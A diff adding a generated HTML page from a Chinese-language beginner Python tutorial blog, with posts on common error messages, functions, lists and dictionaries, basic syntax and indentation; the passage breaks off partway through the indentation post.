@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-2026/04/2026-04-25-python基础（会看报错）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/25/2026/04/2026-04-25-python%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BC%9A%E7%9C%8B%E6%8A%A5%E9%94%99%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-24T16:00:00.000Z" itemprop="datePublished">2026-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/25/2026/04/2026-04-25-python%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BC%9A%E7%9C%8B%E6%8A%A5%E9%94%99%EF%BC%89/index/">python基础（会看报错）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：这里就只讲一些简单常见的报错问题及其情况，帮助人查看理解，具体的情况还要具体分析，因为报错的情况太多了。</p>
+<p>基本的错误代码：</p>
+<h2 id="IndentationError-expected-an-indented-block"><a href="#IndentationError-expected-an-indented-block" class="headerlink" title="IndentationError: expected an indented block"></a><strong><em>IndentationError: expected an indented block</em></strong></h2><p>原因：冒号下面没有空格缩进，代码没往右挪<br>解决：冒号下一行统一缩进4个空格</p>
+<h2 id="SyntaxError-invalid-syntax"><a href="#SyntaxError-invalid-syntax" class="headerlink" title="SyntaxError: invalid syntax"></a><em><strong>SyntaxError: invalid syntax</strong></em></h2><p>原因：中文逗号、中文引号、中文冒号、少标点、格式乱<br>解决：所有符号全部切换英文输入法</p>
+<h2 id="NameError-name-‘xxx’-is-not-defined"><a href="#NameError-name-‘xxx’-is-not-defined" class="headerlink" title="NameError: name ‘xxx’ is not defined"></a><strong><em>NameError: name ‘xxx’ is not defined</em></strong></h2><p>原因：变量、函数名字没提前写，直接拿来用<br>解决：先定义，再使用</p>
+<h2 id="IndexError-string-index-out-of-range"><a href="#IndexError-string-index-out-of-range" class="headerlink" title="IndexError: string index out of range"></a><strong><em>IndexError: string index out of range</em></strong></h2><p>原因：字符串、列表取值数字太大，没有这个位置<br>解决：下标从0开始，数字写小一点</p>
+<h2 id="KeyError"><a href="#KeyError" class="headerlink" title="KeyError"></a><em><strong>KeyError</strong></em></h2><p>原因：字典里面没有你写的这个名字，单词写错<br>解决：核对字典关键字，一字不差</p>
+<h2 id="TypeError-object-of-type-‘int’-has-no-len"><a href="#TypeError-object-of-type-‘int’-has-no-len" class="headerlink" title="TypeError: object of type ‘int’ has no len()"></a><strong><em>TypeError: object of type ‘int’ has no len()</em></strong></h2><p>原因：给数字用len()、下标取值</p>
+<p>解决：len只能用文字、列表，不能用数字</p>
+<h2 id="TypeError-can-only-concatenate-str-not-“int”-to-str"><a href="#TypeError-can-only-concatenate-str-not-“int”-to-str" class="headerlink" title="TypeError: can only concatenate str (not “int”) to str"></a><em><strong>TypeError: can only concatenate str (not “int”) to str</strong></em></h2><p>原因：文字和数字直接相加拼接<br>解决：不要字符串和数字混着相加</p>
+<h2 id="TypeError-missing-1-required-positional-argument"><a href="#TypeError-missing-1-required-positional-argument" class="headerlink" title="TypeError: missing 1 required positional argument"></a><strong><em>TypeError: missing 1 required positional argument</em></strong></h2><p>原因：函数有参数，调用的时候括号空着没传东西<br>解决：调用括号里填上内容</p>
+<h2 id="TypeError-takes-0-arguments-but-1-was-given"><a href="#TypeError-takes-0-arguments-but-1-was-given" class="headerlink" title="TypeError: takes 0 arguments but 1 was given"></a><strong><em>TypeError: takes 0 arguments but 1 was given</em></strong></h2><p>原因：函数没有参数，调用时多写了内容<br>解决：调用括号清空</p>
+<h2 id="NameError-name-‘fun’-is-not-defined"><a href="#NameError-name-‘fun’-is-not-defined" class="headerlink" title="NameError: name ‘fun’ is not defined"></a><strong><em>NameError: name ‘fun’ is not defined</em></strong></h2><p>原因：先调用函数，后面才写def函数<br>解决：从上到下，先定义函数，再调用</p>
+<h2 id="SyntaxError"><a href="#SyntaxError" class="headerlink" title="SyntaxError"></a><strong><em>SyntaxError</em></strong></h2><p>原因：定义函数括号里写带引号内容<br>解决：def括号只写名字，引号内容写在调用那里</p>
+<h2 id="IndentationError-unindent-does-not-match"><a href="#IndentationError-unindent-does-not-match" class="headerlink" title="IndentationError: unindent does not match"></a><strong><em>IndentationError: unindent does not match</em></strong></h2><p>原因：缩进一会大一会小，空格很乱<br>解决：全部对齐，缩进大小统一</p>
+<h2 id="TypeError-unsupported-operand-type"><a href="#TypeError-unsupported-operand-type" class="headerlink" title="TypeError: unsupported operand type"></a><strong><em>TypeError: unsupported operand type</em></strong></h2><p>原因：两个不能加减的数据强行运算<br>解决：换成相同类型数据计算</p>
+<h2 id="代码不报错，运行空白啥都不出来"><a href="#代码不报错，运行空白啥都不出来" class="headerlink" title="代码不报错，运行空白啥都不出来"></a><strong><em>代码不报错，运行空白啥都不出来</em></strong></h2><p>原因：只写了函数，没有调用函数<br>解决：最后一行加上 函数名()</p>
+<h2 id="SyntaxError-EOL-while-scanning-string-literal"><a href="#SyntaxError-EOL-while-scanning-string-literal" class="headerlink" title="SyntaxError: EOL while scanning string literal"></a><strong><em>SyntaxError: EOL while scanning string literal</em></strong></h2><p>原因：引号只写了一半，少半边引号<br>解决：引号左右成对写完整</p>
+<h2 id="TypeError-len-takes-exactly-one-argument"><a href="#TypeError-len-takes-exactly-one-argument" class="headerlink" title="TypeError: len() takes exactly one argument"></a><strong><em>TypeError: len() takes exactly one argument</em></strong></h2><p>原因：len括号里多写、少写内容<br>解决：len()里面只放一个数据</p>
+<h2 id="总结：基本上我认为大致就这些东西了，然后，后面就看你自己还要学什么了，这些都只是教你入个门，一些基本的你应该也可以看懂了，后面就是研究别人的代码，要学更多的就涉及到导入一些第三方库了，基本上每一个库就够单开一个专门介绍了，后面可能会介绍一些，但是，我就只教个入门，毕竟我也没有系统学过这，只是一些我自己根据网上的教学总结的一些东西罢了，反正是要什么去学什么，只要达到目的就行，又不是真的要了解的很牛，记住所有的代码都只是你达到目的的工具，不要被他束缚了，只要能跑就是好代码。"><a href="#总结：基本上我认为大致就这些东西了，然后，后面就看你自己还要学什么了，这些都只是教你入个门，一些基本的你应该也可以看懂了，后面就是研究别人的代码，要学更多的就涉及到导入一些第三方库了，基本上每一个库就够单开一个专门介绍了，后面可能会介绍一些，但是，我就只教个入门，毕竟我也没有系统学过这，只是一些我自己根据网上的教学总结的一些东西罢了，反正是要什么去学什么，只要达到目的就行，又不是真的要了解的很牛，记住所有的代码都只是你达到目的的工具，不要被他束缚了，只要能跑就是好代码。" class="headerlink" title="总结：基本上我认为大致就这些东西了，然后，后面就看你自己还要学什么了，这些都只是教你入个门，一些基本的你应该也可以看懂了，后面就是研究别人的代码，要学更多的就涉及到导入一些第三方库了，基本上每一个库就够单开一个专门介绍了，后面可能会介绍一些，但是，我就只教个入门，毕竟我也没有系统学过这，只是一些我自己根据网上的教学总结的一些东西罢了，反正是要什么去学什么，只要达到目的就行，又不是真的要了解的很牛，记住所有的代码都只是你达到目的的工具，不要被他束缚了，只要能跑就是好代码。"></a><strong><em>总结：基本上我认为大致就这些东西了，然后，后面就看你自己还要学什么了，这些都只是教你入个门，一些基本的你应该也可以看懂了，后面就是研究别人的代码，要学更多的就涉及到导入一些第三方库了，基本上每一个库就够单开一个专门介绍了，后面可能会介绍一些，但是，我就只教个入门，毕竟我也没有系统学过这，只是一些我自己根据网上的教学总结的一些东西罢了，反正是要什么去学什么，只要达到目的就行，又不是真的要了解的很牛，记住所有的代码都只是你达到目的的工具，不要被他束缚了，只要能跑就是好代码。</em></strong></h2><p>拓展：Python自带功能有限，想要实现更多功能，需要第三方库<br>第三方库不属于自带内容，需要手动安装、引入使用</p>
+<p>引入是import 库名</p>
+<p>安装是在终端输入pip install 库 （当然可能会因为网络安装不行，请自己去配网络镜像，清华源这些）</p>
+<p>当然这就不是本人要说的内容，主要就推荐常见的几个库自己去学吧</p>
+<p>pygame游戏库、random 随机库、time 时间库、turtle 画图库、pywin32自动化、pyautogui自动化、requests 网络请求库、pillow 图片处理库、</p>
+<p>自己去学就行，网上有不少教程，希望我写的这些对你有帮助，越来越好。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/25/2026/04/2026-04-25-python%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BC%9A%E7%9C%8B%E6%8A%A5%E9%94%99%EF%BC%89/index/" data-id="cuidKzowBgFZYQ2imaEKzdXJy" data-title="python基础（会看报错）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-25-python基础（函数）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/25/2026/04/2026-04-25-python%E5%9F%BA%E7%A1%80%EF%BC%88%E5%87%BD%E6%95%B0%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-24T16:00:00.000Z" itemprop="datePublished">2026-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/25/2026/04/2026-04-25-python%E5%9F%BA%E7%A1%80%EF%BC%88%E5%87%BD%E6%95%B0%EF%BC%89/index/">python基础（函数）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：函数就是把一段重复要用的代码，打包封装起来，你写好一次，后面想用，直接一句话调用就行，不用反反复复复制粘贴一模一样的代码，简直就是懒人的福音。 简化代码，不用重复写大段一模一样的代码，前面学的字符串、列表、所有操作，全都可以放进函数里打包，而且，你定义好了，后面代码也会美观简洁很多。</p>
+<p><strong><em>1、定义一个基础函数</em></strong></p>
+<p>def fun(你要给这个函数起的名字):<br>print(“函数”)  
+ </p>
+<p>解释：<br> def  是固定开头，用来告诉程序，我要打包一个函数<br>括号+冒号必须带，下面缩进里，放你所有要打包的代码</p>
+<p>注意：</p>
+<p>1. def后面必须空格，再写函数名字<br>2. 末尾必须加英文冒号<br>3. 函数里面的代码，必须全部缩进，和你之前学的缩进规则完全通用</p>
+<p><strong>2、调用运行函数</strong></p>
+<p>fun()  
+ </p>
+<p>解释：<br>你打包好代码之后，直接写函数名字+括号<br>程序就会自动运行你里面打包的所有代码</p>
+<p>注意事项：<br>必须先定义函数，再调用函数<br>不能先调用、再写函数，直接爆红报错</p>
+<p><strong><em>3、函数传入参数</em></strong></p>
+<p>def fun(name):<br>print(name)</p>
+<p>fun(“小苏”)  
+ </p>
+<p>解释：<br>括号里的东西，就是你可以往函数里传进去的内容<br>每次调用，可以传入不一样的数据</p>
+<p>注意事项：<br>括号里有几个参数，调用的时候就要传几个内容，数量必须对上</p>
+<p><strong><em>4、函数返回值 return</em></strong></p>
+<p>def fun(a,b):<br>return a+b  
+ </p>
+<p>解释：<br>把函数里面计算出来的结果，丢出函数外面<br>可以拿到结果、继续拿去二次使用</p>
+<p>简单来说就是计算器的结果拿去二次使用，但是这里的结果是输出结果不一定是计算的数字结果。</p>
+<p>注意事项：<br>1、代码遇到return，会直接结束函数运行<br>2、return后面的内容，不会再执行</p>
+<p>函数整体要注意的是</p>
+<p>1. 所有符号全部必须是英文符号<br>2. 函数内部代码，严格遵守缩进规则<br>3. 永远：先定义函数，再调用函数<br>4. 函数名字不能用中文、不能用特殊符号<br>5. 参数数量，调用和定义必须一一对应</p>
+<p>总结：以上就是大致的有关函数的简单知识了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/25/2026/04/2026-04-25-python%E5%9F%BA%E7%A1%80%EF%BC%88%E5%87%BD%E6%95%B0%EF%BC%89/index/" data-id="cuidWrnMK1gt6B4qJScNtKE56" data-title="python基础（函数）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-25-python的基础（列表字典）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E5%9F%BA%E7%A1%80%EF%BC%88%E5%88%97%E8%A1%A8%E5%AD%97%E5%85%B8%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-24T16:00:00.000Z" itemprop="datePublished">2026-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E5%9F%BA%E7%A1%80%EF%BC%88%E5%88%97%E8%A1%A8%E5%AD%97%E5%85%B8%EF%BC%89/index/">python的基础（列表+字典）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注：列表就是一个大盒子，可以一次性装一大堆东西，文字、数字、中文、字母，啥都能往里面放，想想你读书时被的书包，差不多就可以理解了，字典应该可以理解吧，就是我们用来查找东西的。</p>
+<p>之前字符串只能存单独一段文字，列表可以一次性存一整组、一大堆数据，平时班级名单、商品清单、账号列表，全都是用列表，就像excel表格一样。</p>
+<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a><strong><em>列表</em></strong></h2><p>list1 &#x3D; [“小明”,18,”男生”]  
+ </p>
+<p>解释：<br>中括号  []  包起来的，就是列表<br>一个盒子里，同时装了名字、年龄、性别</p>
+<p><strong><em>1.列表下标取值</em></strong></p>
+<p>a &#x3D; [“小明”,18,”男生”]<br>print(a[0])  
+ </p>
+<p>解释：<br>和字符串规则完全一模一样<br>盒子里每个东西，位置从0开始数，精准拿出里面任意一个内容</p>
+<p>这里输出的就是小明</p>
+<p>注意事项：</p>
+<p>1. 下标永远从0开始，不是1<br>2. 数字不能超出盒子里东西的总数，否则直接报错</p>
+<p><strong><em>2.列表添加数据</em></strong></p>
+<p>a.append(“西瓜”)  
+ </p>
+<p>解释：<br>往盒子最后面，新加一个东西放进去</p>
+<p>注意事项：<br>只能往末尾添加，不能插在中间</p>
+<p><strong><em>3.列表删除数据</em></strong></p>
+<p>a.remove(“苹果”)  
+ </p>
+<p>解释：<br>在盒子里，删掉你指定的某一个东西</p>
+<p>注意事项：<br>删除的内容必须盒子里存在，不存在会爆红报错</p>
+<p><strong><em>4.列表修改数据</em></strong></p>
+<p>a[0] &#x3D; “榴莲”  
+ </p>
+<p>解释：<br>找到对应位置，直接换掉盒子里原来的东西</p>
+<p>注意事项：<br>下标位置一定要写对</p>
+<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a><strong><em>字典</em></strong></h2><p>字典就是带标签的盒子，东西都是成对出现的，一边是名字标签，一边是对应内容，一一对应</p>
+<p>列表只有东西，分不清谁是谁，字典可以精准对应信息，比如一个人的所有信息、账号密码、个人资料，全部用字典存储</p>
+<p>dic &#x3D; {“名字”:”小明”,”年龄”:18}  
+ </p>
+<p>解释：<br>大括号  {}  包起来，键值对格式<br>左边是标签，右边是这个标签对应的信息</p>
+<p><strong><em>1.字典取值</em></strong></p>
+<p>dic[“名字”]  
+ </p>
+<p>解释：<br>通过左边的标签，直接拿出右边对应的内容</p>
+<p>注意事项：<br>标签名字必须一模一样，写错一个字直接报错</p>
+<p><strong><em>2.字典添加和修改</em></strong></p>
+<p>dic[“性别”] &#x3D; “男”  
+ </p>
+<p>解释：<br>标签不存在，就是新加内容<br>标签已经存在，就是直接改掉原来的内容</p>
+<p><strong><em>3.字典删除内容</em></strong></p>
+<p>del dic[“年龄”]  
+ </p>
+<p>解释：<br>直接删掉这一整组标签+信息</p>
+<p>注意：</p>
+<p>1. 列表  []  、字典  {}  符号千万不要搞混<br>2. 列表靠数字下标找东西，字典靠标签名字找东西<br>3. 里面所有符号，全部必须是英文符号<br>4. 列表可以重复放一样的东西，字典标签名字不能重复</p>
+<p>总结：这些都是之后学习必要的基础。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E5%9F%BA%E7%A1%80%EF%BC%88%E5%88%97%E8%A1%A8%E5%AD%97%E5%85%B8%EF%BC%89/index/" data-id="cuid62TIxsEkEF-IK9dmtyZl_" data-title="python的基础（列表+字典）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-25-python的教程（基础语法）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-24T16:00:00.000Z" itemprop="datePublished">2026-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%EF%BC%89/index/">python的教程（基础语法）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong><em>1、注释</em></strong></p>
+<p>代码里给自己看的笔记，不然自己写了什么东西都看不懂。<br>程序看到注释就直接跳过，不会运行这一行，方便我们看不爽那行代码不爱删了就注释就行</p>
+<p>单行注释</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>多行注释可以写很多行，都不会运行的  </p>
+<p>“””  
+ </p>
+<p><strong><em>2、print() 输出语句</em></strong></p>
+<p>把东西显示在屏幕上</p>
+<p>print(内容)</p>
+<p>输出文字、汉字、句子文字必须加英文双引号 “”</p>
+<p>print(“你好世界”)  </p>
+<p>输出数字</p>
+<p>数字不需要加引号</p>
+<p>print(666)  
+ </p>
+<p><strong><em>3、变量（这里基本就是核心了，必须搞清楚）</em></strong></p>
+<p>变量 &#x3D; 一个小盒子<br>专门用来存放东西、保存数据</p>
+<p>变量名字 &#x3D; 存放的数据  </p>
+<p><em>= 不是等于号，是放入和装进<br>把右边的数据，装进左边的盒子里</em></p>
+<p>四种最基础数据类型（盒子分4种）</p>
+<p>（1）整数 int</p>
+<p>存放 没有小数点的数字</p>
+<p>age &#x3D; 18</p>
+<p>（2）浮点数 float</p>
+<p>存放 带小数点的小数</p>
+<p>height &#x3D; 1.66</p>
+<p>（3）字符串 str</p>
+<p>存放 所有汉字、字母、句子、符号<br>必须带上英文引号 “” ‘’</p>
+<p>name &#x3D; “小苏”</p>
+<p>（4）布尔类型 bool</p>
+<p>只有固定两个单词</p>
+<p>True  &#x3D; 对、正确、成立</p>
+<p>False  &#x3D; 错、错误、不成立</p>
+<p>例如</p>
+<p>a &#x3D; True<br>b &#x3D; False  
+ </p>
+<p>专门用来判断对错，我个人觉得多用于写那些破循环用来判断对错，这么理解就行。</p>
+<p>使用变量（通过这种方式，我们就可以直接很简短的用我们自己定义好的东西，就不用重复很长一段了）</p>
+<p>盒子存好东西，想用就打印出来</p>
+<p>print(name)<br>print(age)<br>这里会输出你定义的东西</p>
+<p>变量取名规则</p>
+<p>（1）只能写：字母、数字、下划线 _一般命名建议用英文如果有好几段就用_来连接一般是最基础的命名规则。如book_name 相信你通过这种方式可以看懂了吧书的名字。<br>（2）不能用数字开头<br>（3）不能有空格、汉字、特殊符号 ! @ #<br>（4）大写小写不一样 A 和 a 是两个盒子<br>（5）名字简单易懂，age年龄 name名字</p>
+<p><strong><em>4、type() 查看数据类型</em></strong></p>
+<p>print(type(age))</p>
+<p>当你不知道这个盒子里是什么类型<br>用这个代码一看就知道<br>是数字？小数？还是文字？</p>
+<p>其最后输出是</p>
+<p>&lt;class ‘上面的字符’&gt;你看一眼就知道其是什么数据类型了。</p>
+<p><strong><em>（5）算术运算符 加减乘除</em></strong></p>
+<p>+加法</p>
+<p>-减法</p>
+<p>*乘法</p>
+<p>&#x2F; 除法</p>
+<p>&#x2F;&#x2F; 整除（只保留整数部分，不要小数）</p>
+<p>% 取余数（除法剩下多少）</p>
+<p>** 次方 （print（3**2））3的二次方简单吧  
+ </p>
+<p>让程序自动算数学题，数学计算这个应该不需要我介绍了吧</p>
+<p><strong><em>6、input() 输入</em></strong></p>
+<p>name &#x3D; input(“请输入名字：”)  
+ </p>
+<p>print 是程序往外吐东西<br>input 是我们人往程序里打字输入东西</p>
+<p>只要运行，页面会出现方框让你写字<br>你输入什么，变量就存什么</p>
+<p>如上面那个他会显示请输入你的名字：</p>
+<p>你这里就在窗口里输入什么他就会记住什么，当然程序停止的你输入的东西就会没有的，因为我们没有搞他的记忆功能，这里的name的变量就是我们输入的东西</p>
+<p><strong><em>7、比较运算符 判断大小对错</em></strong></p>
+<blockquote>
+<p>大于<br>&lt; 小于<br>= 大于等于<br>&lt;&#x3D; 小于等于<br>=&#x3D; 判断两边是否相等<br>!&#x3D; 判断两边是否不相等  
+ </p>
+</blockquote>
+<p>运算结果只会出现两个：True 或者 False<br>专门给后面判断语句使用，记得这些符号我个人觉的其实就差不多了。</p>
+<p><strong><em>8、逻辑运算符（这个你学过基础的英文应该都可以看懂的）</em></strong></p>
+<p>and  并且 两边都对才是对</p>
+<p>or  或者 一边对就是对</p>
+<p>not  反过来 对变错，错变对</p>
+<p><strong><em>9、if 判断语句（做选择）</em></strong></p>
+<p>中文就是如果……就……</p>
+<p>if 条件:<br>条件成立就执行这里<br>else:<br>条件不成立就执行这里<br>让程序有选择能力<br>比如：大于18输出成年，小于18输出未成年</p>
+<p>多条件判断</p>
+<p>if 条件1:  </p>
+<p>elif 条件2:  </p>
+<p>else:  
+ </p>
+<p>多个情况挨个判断，这里条件要由松到严</p>
+<p><strong><em>10、while 循环（一般是很常用的东西）</em></strong></p>
+<p>作用：重复不停跑代码<br>只要条件是 True 正确，就一直循环<br>条件变成 False 立刻停止</p>
+<p>i &#x3D; 1<br>while i &lt; 5:<br>print(i)<br>i &#x3D; i + 1  
+ </p>
+<p>解释：</p>
+<p> i一开始是1<br>判断1小于5，正确<br>打印i<br>i变大1<br>继续判断，直到i大于5停止</p>
+<p><strong><em>11、for 循环</em></strong></p>
+<p>简单固定次数循环（毕竟你需要循环，但是不可能有的循环循环一辈子吧）</p>
+<p>for i in range(5):<br>print(i)  
+ </p>
+<p>range(5) 代表循环 5次</p>
+<p>循环两个控制关键词</p>
+<p>break  直接彻底结束整个循环</p>
+<p>continue  跳过当前这一次，直接下一轮</p>
+<p><strong>12、列表 list 中括号 []</strong></p>
+<p>num &#x3D; [1,2,3,4,5]  
+ </p>
+<p>一个盒子装一大堆数据<br>可以同时放数字、文字</p>
+<p>取值：</p>
+<p>print(num[0])  
+ </p>
+<p>注：程序从0开始数第一个<br>第1个数据下标是0<br>第2个是1</p>
+<p>这里相当于取的值就是上面的1，其最后输出的值就是1</p>
+<p><strong><em>13、字典 dict 大括号 {}</em></strong></p>
+<p>info &#x3D; {“name”:”小明”}  
+ </p>
+<p>一一对应存放信息<br>名字对应人，年龄对应数字<br>方便查找个人信息</p>
+<p>比如上面那个如果再写print（info[“name”]）输出的就是小明</p>
+<p><strong>14、<em>自定义函数 def</em></strong></p>
+<p>def hello():<br>print(“你好”)</p>
+<p>hello()  
+ </p>
+<p>把一堆代码打包成一个功能<br>以后想用，只需要写名字调用<br>不用一遍一遍复制粘贴代码</p>
+<p>比如上面这个就是把print(“你好”)打包成了hello()，写好了，后面要这个功能就直接写hello()就行了。</p>
+<p>总结：大致认识这些其实我个人觉得就差不多了，虽然看着不多但是一定要记住，这些基本上就是很基础的东西了，你可以在pycharm一个个的试，很有成就感的，最开始我们学习一定要会抄，这样你才会慢慢脑子里有自己的想法。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%EF%BC%89/index/" data-id="cuidICp3BcSbMHxg8yTp57kjQ" data-title="python的教程（基础语法）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026/04/2026-04-25-python的教程（缩进）/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E7%BC%A9%E8%BF%9B%EF%BC%89/index/" class="article-date">
+  <time class="dt-published" datetime="2026-04-24T16:00:00.000Z" itemprop="datePublished">2026-04-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E6%95%99%E7%A8%8B/">python教程</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/25/2026/04/2026-04-25-python%E7%9A%84%E6%95%99%E7%A8%8B%EF%BC%88%E7%BC%A9%E8%BF%9B%EF%BC%89/index/">python的教程（缩进）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Python的缩进，就是代码行开头空出来的空格，专门用来告诉程序哪里是该这个程序管理，那段不该他管理，如果你下载了IDE基本上按一下tab就能补全，但这里我们还是要学，因为，这些是最基础的，只有学好了才能真正的去看懂一些代码，知道他们的逻辑，tab只是帮助我们不去重复做一个事情罢了。</p>
+<p><strong><em>1、if 判断语句 缩进规范</em></strong></p>
+<p>格式</p>
+<p>if 条件:<br>执行内容<br>elif 条件:<br>执行内容<br>else:<br>执行内容</p>
+<p>注意</p>
+<p>（1）if&#x2F;elif&#x2F;else 末尾必须带冒号</p>
+<p>（2）冒号下一行必须缩进4个空格</p>
+<p>（3）同一层级代码缩进必须完全对齐</p>
+<p><strong><em>2、while 循环 缩进规范</em></strong></p>
+<p>格式<br> while 循环条件:<br>循环内执行内容</p>
+<p>注意</p>
+<p>（1）while 末尾必须带冒号</p>
+<p>（2）循环内所有代码统一缩进4个空格</p>
+<p>（3）循环结束后代码取消缩进</p>
+<p><strong><em>3、for 循环 缩进规范</em></strong></p>
+<p>格式</p>
+<p>for 变量 in 循环范围:<br>循环内执行内容</p>
+<p>注意：</p>
+<p>（1）for 末尾必须带冒号</p>
+<p>（2）循环内代码（包括break&#x2F;continue）必须缩进4个空格</p>
+<p>(3)循环结束后代码取消缩进</p>
+<p><strong><em>4、def 自定义函数 缩进规范</em></strong></p>
+<p>格式</p>
+<p>def 函数名():<br>函数内执行内容</p>
+<p>注意</p>
